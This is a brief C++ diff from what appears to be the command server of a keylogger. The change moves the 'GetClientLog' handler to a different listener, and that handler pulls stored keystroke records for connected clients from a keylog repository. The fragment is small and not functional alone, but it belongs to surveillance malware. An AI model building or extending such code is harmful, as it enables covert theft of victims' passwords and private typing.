@@ -38,7 +38,7 @@ public:
 
             _eventEmitter->Emit("Commander:SpiderNetworkManager", SpiderSerializer::CreateResponseFromPayload(clientId, res));
         });
-        _commandListClientListener->Register("GetClientLog", [&](std::string clientId, GetClientLog &payload) {
+        _commandGetLogListener->Register("GetClientLog", [&](std::string clientId, GetClientLog &payload) {
             auto vec = _keylogRepository->GetSecondaryKeyElements("uuids", 0, payload.limit());
             GetKeylogCommandResponse res;
             for(auto const& value: vec)
